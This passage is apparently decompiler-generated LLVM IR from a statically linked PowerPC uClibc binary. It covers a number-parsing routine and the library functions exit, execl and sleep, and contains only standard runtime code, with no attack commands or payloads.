  %v0_100111fc = load i32, i32* %r30.global-to-local, align 4
  %v1_100111fc = add i32 %v0_100111fc, 10
  store i32 %v1_100111fc, i32* %r30.global-to-local, align 4
  %v3_10011200 = icmp eq i8 %v2_100111f8, 48
  br i1 %v3_10011200, label %dec_label_pc_10011208, label %dec_label_pc_10011228

dec_label_pc_10011208:                            ; preds = %dec_label_pc_100111f8
  %v1_10011208 = add i32 %v0_100111f8, 1
  %v2_10011208 = inttoptr i32 %v1_10011208 to i8*
  %v3_10011208 = load i8, i8* %v2_10011208, align 1
  %v4_10011208 = zext i8 %v3_10011208 to i32
  store i32 %v1_10011208, i32* %r31.global-to-local, align 4
  %v1_1001120c = add i32 %v0_100111fc, 8
  store i32 %v1_1001120c, i32* %r30.global-to-local, align 4
  %v1_10011210 = or i32 %v4_10011208, 32
  %v3_10011218 = icmp eq i32 %v1_10011210, 120
  br i1 %v3_10011218, label %dec_label_pc_10011220, label %dec_label_pc_10011228

dec_label_pc_10011220:                            ; preds = %dec_label_pc_10011208
  %v1_10011220 = mul i32 %v1_1001120c, 2
  store i32 %v1_10011220, i32* %r30.global-to-local, align 4
  %v1_10011224 = add i32 %v0_100111f8, 2
  store i32 %v1_10011224, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011228

dec_label_pc_10011228:                            ; preds = %dec_label_pc_10011208, %dec_label_pc_100111f8, %dec_label_pc_10011220
  %v0_100112dc15 = phi i32 [ %v1_10011208, %dec_label_pc_10011220 ], [ %tmp, %dec_label_pc_100111f8 ], [ %v1_10011208, %dec_label_pc_10011208 ]
  %v0_10011228 = phi i32 [ %v1_10011220, %dec_label_pc_10011220 ], [ %v1_100111fc, %dec_label_pc_100111f8 ], [ %v1_1001120c, %dec_label_pc_10011208 ]
  %tmp22 = icmp slt i32 %v0_10011228, 17
  br i1 %tmp22, label %dec_label_pc_10011234, label %dec_label_pc_10011230

dec_label_pc_10011230:                            ; preds = %dec_label_pc_10011228
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10011234

dec_label_pc_10011234:                            ; preds = %dec_label_pc_100111ec.dec_label_pc_10011234_crit_edge, %dec_label_pc_10011228, %dec_label_pc_10011230
  %v0_100112dc14 = phi i32 [ %tmp, %dec_label_pc_100111ec.dec_label_pc_10011234_crit_edge ], [ %v0_100112dc15, %dec_label_pc_10011228 ], [ %v0_100112dc15, %dec_label_pc_10011230 ]
  %v1_10011248 = phi i32 [ %v0_10011234.pre, %dec_label_pc_100111ec.dec_label_pc_10011234_crit_edge ], [ %v0_10011228, %dec_label_pc_10011228 ], [ 16, %dec_label_pc_10011230 ]
  %v1_10011234 = add i32 %v1_10011248, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1001123c = icmp ugt i32 %v1_10011234, 34
  br i1 %v2_1001123c, label %dec_label_pc_100112d4, label %dec_label_pc_10011244

dec_label_pc_10011244:                            ; preds = %dec_label_pc_10011234
  %v2_10011248 = udiv i32 -1, %v1_10011248
  store i32 %v2_10011248, i32* @r29, align 4
  %v2_1001124c = mul i32 %v2_10011248, %v1_10011248
  %v1_10011250 = sub i32 -1, %v2_1001124c
  %v1_10011254 = urem i32 %v1_10011250, 256
  store i32 %v1_10011254, i32* @r27, align 4
  %v0_10011260.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011260

dec_label_pc_1001125c:                            ; preds = %dec_label_pc_100112c8, %dec_label_pc_100112b0
  %v1_10011264.pre = phi i32 [ %v1_10011268, %dec_label_pc_100112c8 ], [ %v1_10011264.pre.pre, %dec_label_pc_100112b0 ]
  %v0_10011264.pre = phi i32 [ %v2_100112cc, %dec_label_pc_100112c8 ], [ %v0_10011264.pre.pre, %dec_label_pc_100112b0 ]
  %v0_1001125c = phi i32 [ %v1_1001126c, %dec_label_pc_100112c8 ], [ %v0_1001125c.pre, %dec_label_pc_100112b0 ]
  br label %dec_label_pc_10011260

dec_label_pc_10011260:                            ; preds = %dec_label_pc_10011244, %dec_label_pc_1001125c
  %v0_100112dc12 = phi i32 [ %v0_100112dc14, %dec_label_pc_10011244 ], [ %v0_1001125c, %dec_label_pc_1001125c ]
  %v0_1001126c = phi i32 [ %v0_10011260.pre, %dec_label_pc_10011244 ], [ %v0_1001125c, %dec_label_pc_1001125c ]
  %v1_10011268 = phi i32 [ %v2_10011248, %dec_label_pc_10011244 ], [ %v1_10011264.pre, %dec_label_pc_1001125c ]
  %v0_100112c8 = phi i32 [ 0, %dec_label_pc_10011244 ], [ %v0_10011264.pre, %dec_label_pc_1001125c ]
  %v1_10011260 = inttoptr i32 %v0_1001126c to i8*
  %v2_10011260 = load i8, i8* %v1_10011260, align 1
  %v3_10011260 = zext i8 %v2_10011260 to i32
  %v3_10011264 = icmp ugt i32 %v0_100112c8, %v1_10011268
  %v1_1001126c = add i32 %v0_1001126c, 1
  store i32 %v1_1001126c, i32* %r31.global-to-local, align 4
  %v1_10011270 = add nsw i32 %v3_10011260, -48
  %v1_10011274 = or i32 %v3_10011260, 32
  %v1_10011278 = urem i32 %v1_10011270, 256
  %tmp23 = icmp ult i32 %v1_10011278, 10
  br i1 %tmp23, label %dec_label_pc_10011298, label %dec_label_pc_10011288

dec_label_pc_10011288:                            ; preds = %dec_label_pc_10011260
  %tmp24 = icmp ult i32 %v1_10011274, 97
  br i1 %tmp24, label %dec_label_pc_10011298, label %dec_label_pc_10011294

dec_label_pc_10011294:                            ; preds = %dec_label_pc_10011288
  %v1_10011288 = add nsw i32 %v1_10011274, -87
  %v1_10011294 = urem i32 %v1_10011288, 256
  br label %dec_label_pc_10011298

dec_label_pc_10011298:                            ; preds = %dec_label_pc_10011288, %dec_label_pc_10011260, %dec_label_pc_10011294
  %v1_100112cc = phi i32 [ 40, %dec_label_pc_10011288 ], [ %v1_10011278, %dec_label_pc_10011260 ], [ %v1_10011294, %dec_label_pc_10011294 ]
  %v1_10011298 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011298 = icmp slt i32 %v1_100112cc, %v1_10011298
  br i1 %v2_10011298, label %dec_label_pc_100112a0, label %dec_label_pc_100112d4

dec_label_pc_100112a0:                            ; preds = %dec_label_pc_10011298
  br i1 %v3_10011264, label %dec_label_pc_100112b0, label %dec_label_pc_100112a4

dec_label_pc_100112a4:                            ; preds = %dec_label_pc_100112a0
  %v1_100112a4 = load i32, i32* @r27, align 4
  %v0_100112a8.not = icmp ne i32 %v0_100112c8, %v1_10011268
  %tmp25 = icmp ule i32 %v1_100112cc, %v1_100112a4
  %or.cond = or i1 %tmp25, %v0_100112a8.not
  br i1 %or.cond, label %dec_label_pc_100112c8, label %dec_label_pc_100112b0

dec_label_pc_100112b0:                            ; preds = %dec_label_pc_100112a4, %dec_label_pc_100112a0
  %v0_100112b0 = call i32 @__errno_location()
  %v0_100112b4 = load i32, i32* @r28, align 4
  %v1_100112b4 = load i32, i32* @r26, align 4
  %v2_100112b4 = and i32 %v1_100112b4, %v0_100112b4
  store i32 %v2_100112b4, i32* @r28, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_100112c0 = inttoptr i32 %v0_100112b0 to i32*
  store i32 34, i32* %v2_100112c0, align 4
  %v0_1001125c.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10011264.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10011264.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001125c

dec_label_pc_100112c8:                            ; preds = %dec_label_pc_100112a4
  %v2_100112c8 = mul i32 %v1_10011298, %v0_100112c8
  %v2_100112cc = add i32 %v2_100112c8, %v1_100112cc
  store i32 %v2_100112cc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1001125c

dec_label_pc_100112d4:                            ; preds = %dec_label_pc_10011298, %dec_label_pc_10011234
  %v0_100112dc = phi i32 [ %v0_100112dc14, %dec_label_pc_10011234 ], [ %v0_100112dc12, %dec_label_pc_10011298 ]
  %v0_100112d4 = load i32, i32* @r25, align 4
  %v3_100112d4 = icmp eq i32 %v0_100112d4, 0
  br i1 %v3_100112d4, label %dec_label_pc_100112e0, label %dec_label_pc_100112dc

dec_label_pc_100112dc:                            ; preds = %dec_label_pc_100112d4
  %v2_100112dc = inttoptr i32 %v0_100112d4 to i32*
  store i32 %v0_100112dc, i32* %v2_100112dc, align 4
  br label %dec_label_pc_100112e0

dec_label_pc_100112e0:                            ; preds = %dec_label_pc_100112d4, %dec_label_pc_100112dc
  %v0_100112e0 = load i32, i32* @r26, align 4
  %v3_100112e0 = icmp eq i32 %v0_100112e0, 0
  %v0_100112e4 = load i32, i32* @r28, align 4
  %v1_100112e4 = sub i32 0, %v0_100112e4
  %tmp27 = lshr i32 %v1_100112e4, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_10011324.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_100112e0, label %dec_label_pc_10011314, label %dec_label_pc_100112fc

dec_label_pc_100112fc:                            ; preds = %dec_label_pc_100112e0
  %v3_100112fc = icmp ugt i32 %v0_10011324.pre.pre, %tmp28
  br i1 %v3_100112fc, label %dec_label_pc_10011304, label %dec_label_pc_10011314

dec_label_pc_10011304:                            ; preds = %dec_label_pc_100112fc
  %v0_10011304 = call i32 @__errno_location()
  %v2_1001130c = inttoptr i32 %v0_10011304 to i32*
  store i32 34, i32* %v2_1001130c, align 4
  %v0_10011310 = load i32, i32* @r31, align 4
  store i32 %v0_10011310, i32* %r8.global-to-local, align 4
  %v0_10011314.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10011314

dec_label_pc_10011314:                            ; preds = %dec_label_pc_100112e0, %dec_label_pc_100112fc, %dec_label_pc_10011304
  %v0_10011324.pre = phi i32 [ %v0_10011324.pre.pre, %dec_label_pc_100112fc ], [ %v0_10011310, %dec_label_pc_10011304 ], [ %v0_10011324.pre.pre, %dec_label_pc_100112e0 ]
  %v0_10011314 = phi i32 [ %v0_100112e4, %dec_label_pc_100112fc ], [ %v0_10011314.pre, %dec_label_pc_10011304 ], [ %v0_100112e4, %dec_label_pc_100112e0 ]
  %v3_10011314 = icmp eq i32 %v0_10011314, 0
  br i1 %v3_10011314, label %dec_label_pc_10011320, label %dec_label_pc_1001131c

dec_label_pc_1001131c:                            ; preds = %dec_label_pc_10011314
  %v1_1001131c = sub i32 0, %v0_10011324.pre
  store i32 %v1_1001131c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10011320

dec_label_pc_10011320:                            ; preds = %dec_label_pc_10011314, %dec_label_pc_1001131c
  %v0_10011324 = phi i32 [ %v1_1001131c, %dec_label_pc_1001131c ], [ %v0_10011324.pre, %dec_label_pc_10011314 ]
  ret i32 %v0_10011324

; uselistorder directives
  uselistorder i32 %v0_10011324.pre, { 1, 0 }
  uselistorder i32 %v0_10011324.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_100112cc, { 1, 0 }
  uselistorder i32 %v1_10011278, { 1, 0 }
  uselistorder i32 %v1_10011274, { 1, 0 }
  uselistorder i32 %v1_1001126c, { 1, 0 }
  uselistorder i32 %v3_10011260, { 1, 0 }
  uselistorder i32 %v0_100112c8, { 1, 0, 2 }
  uselistorder i32 %v1_10011268, { 0, 2, 1 }
  uselistorder i32 %v0_1001125c, { 1, 0 }
  uselistorder i32 %v2_10011248, { 1, 0, 2 }
  uselistorder i32 %v1_10011220, { 1, 0 }
  uselistorder i32 %v1_1001120c, { 1, 0, 2 }
  uselistorder i32 %v0_100111e8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 7, 2, 3, 6, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 5, 1, 0, 2, 3, 6, 4, 7 }
  uselistorder label %dec_label_pc_10011320, { 1, 0 }
  uselistorder label %dec_label_pc_10011314, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100112e0, { 1, 0 }
  uselistorder label %dec_label_pc_10011298, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011260, { 1, 0 }
  uselistorder label %dec_label_pc_10011234, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011228, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100111ec, { 1, 0 }
  uselistorder label %dec_label_pc_100111e8, { 1, 0 }
  uselistorder label %dec_label_pc_100111b4, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10011350 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1001135c = load i32, i32* @r3, align 4
  store i32 %v0_1001135c, i32* @r31, align 4
  store i32 %v2_10011350, i32* @r3, align 4
  %v0_10011368 = call i32 @__pthread_return_void()
  %v0_10011370 = call i32 @__pthread_return_0()
  %v3_10011378 = load i32, i32* @global_var_1002c924.1110, align 4
  %v3_1001137c = icmp eq i32 %v3_10011378, 0
  br i1 %v3_1001137c, label %dec_label_pc_10011390, label %dec_label_pc_10011384

dec_label_pc_10011384:                            ; preds = %entry
  %v0_10011384 = load i32, i32* @r31, align 4
  %v3_1001138c = call i32 @unknown_0(i32 %v0_10011384, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  br label %dec_label_pc_10011390

dec_label_pc_10011390:                            ; preds = %entry, %dec_label_pc_10011384
  store i32 %v2_10011350, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_10011398 = call i32 @__pthread_return_void()
  store i32 %v0_10011398, i32* @r3, align 4
  store i32 268506016, i32* @lr, align 4
  %v1_1001139c = call i32 @__GI___uClibc_fini(i32 %v0_10011398)
  store i32 268506036, i32* @lr, align 4
  %v2_100113b0 = call i32 @_stdio_term(i32 %v1_1001139c, i32 268493012)
  %v0_100113b4 = load i32, i32* @r31, align 4
  %v1_100113b8 = call i32 @__GI__exit(i32 %v0_100113b4)
  ret i32 %v1_100113b8

; uselistorder directives
  uselistorder label %dec_label_pc_10011390, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100113bc = ptrtoint i32* %stack_var_0 to i32
  %v2_100113d8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100113d8, i32* %r0.global-to-local, align 4
  %v2_100113e0 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_100113d8, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1001140c

dec_label_pc_1001140c:                            ; preds = %dec_label_pc_1001143c, %entry
  %v0_10011410 = phi i32 [ 0, %entry ], [ %v1_10011410, %dec_label_pc_1001143c ]
  %stack_var_-52.0 = phi i32 [ %v2_100113e0, %entry ], [ %stack_var_-52.1, %dec_label_pc_1001143c ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_1001143c ]
  %v4_1001140c = zext i8 %stack_var_-56.0 to i32
  %v1_10011410 = add i32 %v0_10011410, 1
  %v1_10011418 = mul nuw nsw i32 %v4_1001140c, 4
  store i32 %v1_10011418, i32* %r0.global-to-local, align 4
  %v2_1001141c = add i32 %v1_10011418, %v2_100113d8
  store i32 %v2_1001141c, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_10011430, label %dec_label_pc_10011428

dec_label_pc_10011428:                            ; preds = %dec_label_pc_1001140c
  %v1_10011420 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1001143c

dec_label_pc_10011430:                            ; preds = %dec_label_pc_1001140c
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_10011434 = add i32 %stack_var_-52.0, 4
  store i32 %v1_10011434, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001143c

dec_label_pc_1001143c:                            ; preds = %dec_label_pc_10011428, %dec_label_pc_10011430
  %stack_var_-52.1 = phi i32 [ %v1_10011434, %dec_label_pc_10011430 ], [ %stack_var_-52.0, %dec_label_pc_10011428 ]
  %v0_1001143c = phi i32 [ %stack_var_-52.0, %dec_label_pc_10011430 ], [ %v2_1001141c, %dec_label_pc_10011428 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_10011430 ], [ %v1_10011420, %dec_label_pc_10011428 ]
  %v1_1001143c = inttoptr i32 %v0_1001143c to i32*
  %v2_1001143c = load i32, i32* %v1_1001143c, align 4
  store i32 %v2_1001143c, i32* %r0.global-to-local, align 4
  %v3_10011440 = icmp eq i32 %v2_1001143c, 0
  br i1 %v3_10011440, label %dec_label_pc_10011448, label %dec_label_pc_1001140c

dec_label_pc_10011448:                            ; preds = %dec_label_pc_1001143c
  %v1_10011448 = mul i32 %v1_10011410, 4
  store i32 %v4_100113bc, i32* %r0.global-to-local, align 4
  %v1_10011450 = add i32 %v1_10011448, 34
  store i32 %v1_10011410, i32* %ctr.global-to-local, align 4
  %v1_10011458 = call i32 @__asm_rlwinm(i32 %v1_10011450, i32 0, i32 0, i32 27)
  %v1_10011460 = load i32, i32* @r1, align 4
  %v3_10011460 = sub i32 %v1_10011460, %v1_10011458
  %v4_10011460 = inttoptr i32 %v3_10011460 to i32*
  store i32 %v4_100113bc, i32* %v4_10011460, align 4
  %v1_10011464 = add i32 %v3_10011460, 23
  store i32 %v1_10011464, i32* %r0.global-to-local, align 4
  %v1_10011468 = call i32 @__asm_rlwinm(i32 %v1_10011464, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10011470 = load i32, i32* %r8.global-to-local, align 4
  %v2_10011470 = inttoptr i32 %v1_10011468 to i32*
  store i32 %v0_10011470, i32* %v2_10011470, align 4
  store i32 %v1_10011468, i32* %r11.global-to-local, align 4
  %v0_10011478 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011478 = trunc i32 %v0_10011478 to i8
  store i32 %v2_100113d8, i32* %r0.global-to-local, align 4
  store i32 %v2_100113d8, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1001148c

dec_label_pc_1001148c:                            ; preds = %dec_label_pc_100114c0.dec_label_pc_1001148c_crit_edge, %dec_label_pc_10011448
  %v0_10011490 = phi i32 [ %v1_10011468, %dec_label_pc_10011448 ], [ %v0_10011490.pre, %dec_label_pc_100114c0.dec_label_pc_1001148c_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_100113e0, %dec_label_pc_10011448 ], [ %stack_var_-52.3, %dec_label_pc_100114c0.dec_label_pc_1001148c_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_10011478, %dec_label_pc_10011448 ], [ %stack_var_-56.3, %dec_label_pc_100114c0.dec_label_pc_1001148c_crit_edge ]
  %v1_10011490 = add i32 %v0_10011490, 4
  store i32 %v1_10011490, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_100114b4, label %dec_label_pc_100114a4

dec_label_pc_100114a4:                            ; preds = %dec_label_pc_1001148c
  %v4_1001148c = zext i8 %stack_var_-56.2 to i32
  %v1_1001149c = add i8 %stack_var_-56.2, 1
  %v1_10011498 = mul nuw nsw i32 %v4_1001148c, 4
  %v3_100114a4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_100114a4, i32* %r0.global-to-local, align 4
  %v2_100114ac = add i32 %v3_100114a4, %v1_10011498
  br label %dec_label_pc_100114c0

dec_label_pc_100114b4:                            ; preds = %dec_label_pc_1001148c
  %v1_100114b8 = add i32 %stack_var_-52.2, 4
  store i32 %v1_100114b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100114c0

dec_label_pc_100114c0:                            ; preds = %dec_label_pc_100114a4, %dec_label_pc_100114b4
  %stack_var_-52.3 = phi i32 [ %v1_100114b8, %dec_label_pc_100114b4 ], [ %stack_var_-52.2, %dec_label_pc_100114a4 ]
  %v0_100114c0 = phi i32 [ %stack_var_-52.2, %dec_label_pc_100114b4 ], [ %v2_100114ac, %dec_label_pc_100114a4 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_100114b4 ], [ %v1_1001149c, %dec_label_pc_100114a4 ]
  %v1_100114c0 = inttoptr i32 %v0_100114c0 to i32*
  %v2_100114c0 = load i32, i32* %v1_100114c0, align 4
  store i32 %v2_100114c0, i32* %r0.global-to-local, align 4
  %v2_100114c4 = inttoptr i32 %v1_10011490 to i32*
  store i32 %v2_100114c0, i32* %v2_100114c4, align 4
  %v0_100114c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100114c8 = add i32 %v0_100114c8, -1
  store i32 %v1_100114c8, i32* %ctr.global-to-local, align 4
  %v2_100114c8 = icmp eq i32 %v1_100114c8, 0
  br i1 %v2_100114c8, label %dec_label_pc_100114cc, label %dec_label_pc_100114c0.dec_label_pc_1001148c_crit_edge

dec_label_pc_100114c0.dec_label_pc_1001148c_crit_edge: ; preds = %dec_label_pc_100114c0
  %v0_10011490.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001148c

dec_label_pc_100114cc:                            ; preds = %dec_label_pc_100114c0
  %v3_100114d0 = load i32, i32* @global_var_1002c92c.1112, align 4
  store i32 268506328, i32* @lr, align 4
  %v2_100114d4 = call i32 @__GI_execve(i32 %v3_100114d0, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_100114d8 = load i32, i32* @r1, align 4
  %v1_100114d8 = inttoptr i32 %v0_100114d8 to i32*
  %v2_100114d8 = load i32, i32* %v1_100114d8, align 4
  store i32 %v2_100114d8, i32* %r11.global-to-local, align 4
  %v1_100114dc = add i32 %v2_100114d8, 4
  %v2_100114dc = inttoptr i32 %v1_100114dc to i32*
  %v3_100114dc = load i32, i32* %v2_100114dc, align 4
  store i32 %v3_100114dc, i32* %r0.global-to-local, align 4
  ret i32 %v2_100114d4

; uselistorder directives
  uselistorder i32 %v1_100114c8, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_10011418, { 1, 0 }
  uselistorder i32 %v1_10011410, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_100113d8, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32 27, { 3, 4, 1, 2, 0, 5 }
  uselistorder i8 1, { 0, 1, 10, 11, 12, 13, 17, 18, 15, 16, 2, 3, 19, 14, 9, 8, 7, 6, 5, 4, 20 }
  uselistorder label %dec_label_pc_100114c0, { 1, 0 }
  uselistorder label %dec_label_pc_1001143c, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_100114f0 = icmp eq i32 %arg1, 0
  br i1 %v3_100114f0, label %dec_label_pc_100116a4, label %dec_label_pc_10011520.lr.ph

dec_label_pc_10011520.lr.ph:                      ; preds = %entry
  %v2_10011514 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_10011514, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001152042 = add i32 %v2_10011514, 132
  %v3_1001152043 = inttoptr i32 %v2_1001152042 to i32*
  store i32 0, i32* %v3_1001152043, align 4
  %v0_1001152444 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001152445 = add i32 %v0_1001152444, -1
  store i32 %v1_1001152445, i32* %r11.global-to-local, align 4
  %v1_1001152846 = mul i32 %v1_1001152445, 4
  %v1_1001152c47 = load i32, i32* %r7.global-to-local, align 4
  %v2_1001152c48 = add i32 %v1_1001152c47, %v1_1001152846
  %v0_1001153049 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001153050 = add i32 %v0_1001153049, -1
  store i32 %v1_1001153050, i32* %ctr.global-to-local, align 4
  %v2_1001153051 = icmp eq i32 %v1_1001153050, 0
  br i1 %v2_1001153051, label %dec_label_pc_10011534, label %dec_label_pc_10011520.dec_label_pc_10011520_crit_edge

dec_label_pc_10011520.dec_label_pc_10011520_crit_edge: ; preds = %dec_label_pc_10011520.lr.ph, %dec_label_pc_10011520.dec_label_pc_10011520_crit_edge
  %v2_1001152c52 = phi i32 [ %v2_1001152c, %dec_label_pc_10011520.dec_label_pc_10011520_crit_edge ], [ %v2_1001152c48, %dec_label_pc_10011520.lr.ph ]
  %v0_10011520.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10011520 = add i32 %v2_1001152c52, 8
  %v3_10011520 = inttoptr i32 %v2_10011520 to i32*
  store i32 %v0_10011520.pre, i32* %v3_10011520, align 4
  %v0_10011524 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011524 = add i32 %v0_10011524, -1
  store i32 %v1_10011524, i32* %r11.global-to-local, align 4
  %v1_10011528 = mul i32 %v1_10011524, 4
  %v1_1001152c = load i32, i32* %r7.global-to-local, align 4
  %v2_1001152c = add i32 %v1_1001152c, %v1_10011528
  %v0_10011530 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011530 = add i32 %v0_10011530, -1
  store i32 %v1_10011530, i32* %ctr.global-to-local, align 4
  %v2_10011530 = icmp eq i32 %v1_10011530, 0
  br i1 %v2_10011530, label %dec_label_pc_10011534, label %dec_label_pc_10011520.dec_label_pc_10011520_crit_edge

dec_label_pc_10011534:                            ; preds = %dec_label_pc_10011520.dec_label_pc_10011520_crit_edge, %dec_label_pc_10011520.lr.ph
  %v0_10011548.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_10011534 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_10011534, i32* %r29.global-to-local, align 4
  store i32 %v2_10011534, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_10011548.pre, i32* %stack_var_-440, align 4
  %v0_1001154c = call i32 @__sigaddset()
  store i32 %v0_1001154c, i32* %r3.global-to-local, align 4
  %v1_10011550 = icmp slt i32 %v0_1001154c, 0
  br i1 %v1_10011550, label %dec_label_pc_100116ac, label %dec_label_pc_10011558

dec_label_pc_10011558:                            ; preds = %dec_label_pc_10011534
  %v2_10011558 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268506476, i32* @lr, align 4
  %v3_10011568 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_10011534, i32 %v2_10011558)
  store i32 %v3_10011568, i32* %r3.global-to-local, align 4
  %v3_1001156c = icmp eq i32 %v3_10011568, 0
  br i1 %v3_1001156c, label %dec_label_pc_10011574, label %dec_label_pc_100116ac

dec_label_pc_10011574:                            ; preds = %dec_label_pc_10011558
  store i32 %v2_10011558, i32* %r3.global-to-local, align 4
  %v2_1001157c = call i32 @__sigismember(i32 %v2_10011558, i32 17)
  store i32 %v2_1001157c, i32* %r3.global-to-local, align 4
  %v3_10011580 = icmp eq i32 %v2_1001157c, 0
  br i1 %v3_10011580, label %dec_label_pc_100115a0.lr.ph, label %dec_label_pc_1001166c

dec_label_pc_100115a0.lr.ph:                      ; preds = %dec_label_pc_10011574
  store i32 %v2_10011514, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1001152043, align 4
  %v0_100115a433 = load i32, i32* %r11.global-to-local, align 4
  %v1_100115a434 = add i32 %v0_100115a433, -1
  store i32 %v1_100115a434, i32* %r11.global-to-local, align 4
  %v1_100115a835 = mul i32 %v1_100115a434, 4
  %v1_100115ac36 = load i32, i32* %r8.global-to-local, align 4
  %v2_100115ac37 = add i32 %v1_100115ac36, %v1_100115a835
  %v0_100115b038 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100115b039 = add i32 %v0_100115b038, -1
  store i32 %v1_100115b039, i32* %ctr.global-to-local, align 4
  %v2_100115b040 = icmp eq i32 %v1_100115b039, 0
  br i1 %v2_100115b040, label %dec_label_pc_100115b4, label %dec_label_pc_100115a0.dec_label_pc_100115a0_crit_edge

dec_label_pc_100115a0.dec_label_pc_100115a0_crit_edge: ; preds = %dec_label_pc_100115a0.lr.ph, %dec_label_pc_100115a0.dec_label_pc_100115a0_crit_edge
  %v2_100115ac41 = phi i32 [ %v2_100115ac, %dec_label_pc_100115a0.dec_label_pc_100115a0_crit_edge ], [ %v2_100115ac37, %dec_label_pc_100115a0.lr.ph ]
  %v0_100115a0.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_100115a0 = add i32 %v2_100115ac41, 8
